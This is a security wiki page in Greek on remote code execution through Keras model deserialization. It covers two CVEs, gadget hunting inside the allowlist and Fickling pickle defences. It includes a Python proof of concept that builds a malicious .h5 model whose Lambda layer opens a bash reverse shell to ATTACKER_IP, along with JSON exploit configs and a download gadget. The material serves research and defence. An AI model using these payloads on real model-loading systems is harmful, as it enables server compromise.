# Keras Model Deserialization RCE και Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα συνοψίζει πρακτικές τεχνικές exploitation ενάντια στο pipeline deserialization μοντέλων Keras, εξηγεί τα internals και το attack surface του native format .keras και παρέχει ένα toolkit για researchers, για τον εντοπισμό Model File Vulnerabilities (MFVs) και post-fix gadgets.

## Internals του format μοντέλων .keras

Ένα αρχείο .keras είναι ένα ZIP archive που περιέχει τουλάχιστον:<sup>[[1]](#references)</sup>
- metadata.json – γενικές πληροφορίες (π.χ. έκδοση Keras)
- config.json – αρχιτεκτονική μοντέλου (το κύριο attack surface)
- model.weights.h5 – weights σε HDF5

Το config.json οδηγεί σε recursive deserialization: το Keras κάνει import modules, επιλύει classes/functions και ανακατασκευάζει layers/objects από dictionaries που ελέγχονται από τον attacker.<sup>[[1]](#references)</sup>

Παράδειγμα snippet για ένα object Dense layer:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Η αποσειριοποίηση εκτελεί:<sup>[[1]](#references)</sup>
- Εισαγωγή module και επίλυση symbol από τα keys module/class_name
- Κλήση from_config(...) ή constructor με kwargs ελεγχόμενα από τον attacker
- Αναδρομή σε nested objects (activations, initializers, constraints κ.λπ.)

Ιστορικά, αυτό παρείχε τρία primitives σε έναν attacker που δημιουργούσε το config.json:<sup>[[1]](#references)</sup>
- Έλεγχο των modules που εισάγονται
- Έλεγχο των classes/functions που επιλύονται
- Έλεγχο των kwargs που περνούν στους constructors/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Αιτία:
- Το Lambda.from_config() χρησιμοποιούσε το python_utils.func_load(...), το οποίο κάνει base64-decode και καλεί marshal.loads() σε bytes ελεγχόμενα από τον attacker· το Python unmarshalling μπορεί να εκτελέσει code.<sup>[[1]](#references)[[3]](#references)</sup>

Ιδέα exploit (απλοποιημένο payload στο config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Το Keras επιβάλλει safe_mode=True από προεπιλογή. Οι serialized Python functions στο Lambda αποκλείονται, εκτός εάν ο χρήστης επιλέξει ρητά safe_mode=False.<sup>[[1]](#references)</sup>

Notes:
- Τα παλαιά formats (παλαιότερα HDF5 saves) ή τα παλαιότερα codebases ενδέχεται να μην επιβάλλουν τους σύγχρονους ελέγχους, επομένως οι επιθέσεις τύπου “downgrade” εξακολουθούν να εφαρμόζονται όταν τα victims χρησιμοποιούν παλαιότερους loaders.

## CVE-2025-1550 – Arbitrary module import στο Keras ≤ 3.8

Root cause:
- Η _retrieve_class_or_fn χρησιμοποιούσε το unrestricted importlib.import_module() με attacker-controlled module strings από το config.json.
- Impact: Arbitrary import οποιουδήποτε εγκατεστημένου module (ή attacker-planted module στο sys.path). Ο κώδικας εκτελείται κατά το import και στη συνέχεια πραγματοποιείται object construction με attacker kwargs.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Βελτιώσεις ασφάλειας (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: οι imports περιορίζονται σε official ecosystem modules: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True αποκλείει το unsafe Lambda serialized-function loading
- Basic type checking: τα deserialized objects πρέπει να αντιστοιχούν στους αναμενόμενους τύπους

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Πολλά production stacks εξακολουθούν να αποδέχονται legacy TensorFlow-Keras HDF5 model files (.h5). Αν ένας attacker μπορεί να ανεβάσει ένα model που ο server αργότερα φορτώνει ή χρησιμοποιεί για inference, ένα Lambda layer μπορεί να εκτελέσει arbitrary Python κατά το load/build/predict.<sup>[[7]](#references)</sup>

Minimal PoC για τη δημιουργία ενός malicious .h5 που εκτελεί ένα reverse shell κατά το deserialization ή τη χρήση του:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Σημειώσεις και συμβουλές αξιοπιστίας:
- Σημεία ενεργοποίησης: ο κώδικας μπορεί να εκτελεστεί πολλές φορές (π.χ. κατά το layer build/first call, το model.load_model και τα predict/fit). Κάντε τα payloads idempotent.<sup>[[7]](#references)</sup>
- Pinning εκδόσεων: αντιστοιχίστε τα TF/Keras/Python του στόχου, ώστε να αποφύγετε ασυμφωνίες serialization. Για παράδειγμα, δημιουργήστε artifacts με Python 3.8 και TensorFlow 2.13.1, εάν αυτό χρησιμοποιεί ο στόχος.<sup>[[7]](#references)</sup>
- Γρήγορη αναπαραγωγή περιβάλλοντος:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validation: ένα benign payload όπως το os.system("ping -c 1 YOUR_IP") βοηθά στην επιβεβαίωση της εκτέλεσης (π.χ. παρατηρώντας ICMP με tcpdump) πριν από τη μετάβαση σε reverse shell.<sup>[[7]](#references)</sup>

## Επιφάνεια gadget μετά το fix μέσα στο allowlist

Ακόμη και με allowlisting και safe mode, παραμένει μια ευρεία επιφάνεια μεταξύ των επιτρεπόμενων Keras callables. Για παράδειγμα, το keras.utils.get_file μπορεί να κατεβάσει arbitrary URLs σε τοποθεσίες που επιλέγει ο χρήστης.<sup>[[1]](#references)</sup>

Gadget μέσω Lambda που κάνει reference σε μια επιτρεπόμενη function (χωρίς serialized Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Σημαντικός περιορισμός:
- Το Lambda.call() προσθέτει το input tensor ως πρώτο positional argument κατά την invocation του target callable. Τα επιλεγμένα gadgets πρέπει να ανέχονται ένα επιπλέον positional arg (ή να δέχονται *args/**kwargs). Αυτό περιορίζει το ποιες functions είναι βιώσιμες.<sup>[[1]](#references)</sup>

## ML pickle import allowlisting για AI/ML models (Fickling)

Πολλά AI/ML model formats (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, παλαιότερα TensorFlow artifacts κ.λπ.) ενσωματώνουν Python pickle data. Οι attackers καταχρώνται συστηματικά τα pickle GLOBAL imports και τους object constructors για να επιτύχουν RCE ή model swapping κατά το load. Οι blacklist-based scanners συχνά παραλείπουν νέα ή μη καταχωρισμένα dangerous imports.<sup>[[8]](#references)[[14]](#references)</sup>

Μια πρακτική fail-closed άμυνα είναι το hooking του Python pickle deserializer και η allowlisting μόνο ενός ελεγμένου συνόλου harmless ML-related imports κατά το unpickling. Το Fickling των Trail of Bits υλοποιεί αυτή την policy και παρέχει ένα curated ML import allowlist, το οποίο δημιουργήθηκε από χιλιάδες public Hugging Face pickles.<sup>[[8]](#references)[[13]](#references)</sup>

Security model για τα “safe” imports (διαισθήσεις που προέκυψαν από research και practice): τα imported symbols που χρησιμοποιούνται από ένα pickle πρέπει ταυτόχρονα να:<sup>[[8]](#references)</sup>
- Μην εκτελούν code και μην προκαλούν execution (χωρίς compiled/source code objects, shelling out, hooks κ.λπ.)
- Μην μπορούν να κάνουν get/set arbitrary attributes ή items
- Μην κάνουν import ή obtain references σε άλλα Python objects από το pickle VM
- Μην ενεργοποιούν secondary deserializers (π.χ. marshal, nested pickle), ούτε έμμεσα

Ενεργοποιήστε τα protections του Fickling όσο το δυνατόν νωρίτερα κατά το process startup, ώστε οποιαδήποτε pickle loads εκτελούνται από frameworks (torch.load, joblib.load κ.λπ.) να ελέγχονται:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Επιχειρησιακές συμβουλές:
- Μπορείτε να απενεργοποιείτε/επανενεργοποιείτε προσωρινά τα hooks όπου χρειάζεται:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Εάν ένα γνωστό ασφαλές model αποκλειστεί, επεκτείνετε τη allowlist για το περιβάλλον σας αφού ελέγξετε τα symbols:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Το Fickling εκθέτει επίσης generic runtime guards αν προτιμάτε πιο λεπτομερή έλεγχο:<sup>[[9]](#references)</sup>
- `fickling.always_check_safety()` για την επιβολή ελέγχων σε όλα τα `pickle.load()`
- `with fickling.check_safety():` για επιβολή με περιορισμένο scope
- `fickling.load(path)` / `fickling.is_likely_safe(path)` για μεμονωμένους ελέγχους

- Προτιμήστε non-pickle model formats όπου είναι δυνατό (π.χ. SafeTensors).<sup>[[15]](#references)</sup> Αν πρέπει να αποδεχτείτε pickle, εκτελέστε τους loaders με least privilege, χωρίς network egress, και επιβάλετε το allowlist.

Αυτή η allowlist-first στρατηγική μπλοκάρει αποδεδειγμένα τα συνηθισμένα ML pickle exploit paths, διατηρώντας παράλληλα υψηλή συμβατότητα. Στο benchmark της ToB, το Fickling εντόπισε το 100% των synthetic malicious files και επέτρεψε περίπου το 99% των clean files από τα κορυφαία Hugging Face repos.<sup>[[8]](#references)[[10]](#references)</sup>


## Toolkit ερευνητή

1) Συστηματική ανακάλυψη gadgets σε allowed modules

Enumerate candidate callables across keras, keras_nlp, keras_cv, keras_hub and prioritize those with file/network/process/env side effects.<sup>[[1]](#references)</sup>

<details>
<summary>Enumerate potentially dangerous callables in allowlisted Keras modules</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direct deserialization testing (δεν απαιτείται αρχείο .keras)

Τροφοδοτήστε τους Keras deserializers με ειδικά διαμορφωμένα dicts για να μάθετε τις αποδεκτές παραμέτρους και να παρατηρήσετε τις παρενέργειες.<sup>[[1]](#references)</sup>
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Probing μεταξύ εκδόσεων και formats

Το Keras υπάρχει σε πολλαπλά codebases/eras με διαφορετικά guardrails και formats:<sup>[[1]](#references)</sup>
- Ενσωματωμένο Keras του TensorFlow: tensorflow/python/keras (legacy, προορίζεται για διαγραφή)
- tf-keras: διατηρείται ξεχωριστά
- Multi-backend Keras 3 (official): εισήγαγε το native .keras

Επαναλάβετε τις δοκιμές σε όλα τα codebases και formats (.keras έναντι legacy HDF5), για να εντοπίσετε regressions ή ελλιπή guards.

## Αναφορές

- [1] [Αναζήτηση Vulnerabilities στο Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Προσθήκη checks στο serialization](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE μέσω Keras Lambda deserialization](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Arbitrary module import στο Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE σε root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – ο νέος AI/ML pickle file scanner του Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Ασφάλιση AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Υπόβαθρο των Sleepy Pickle attacks](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
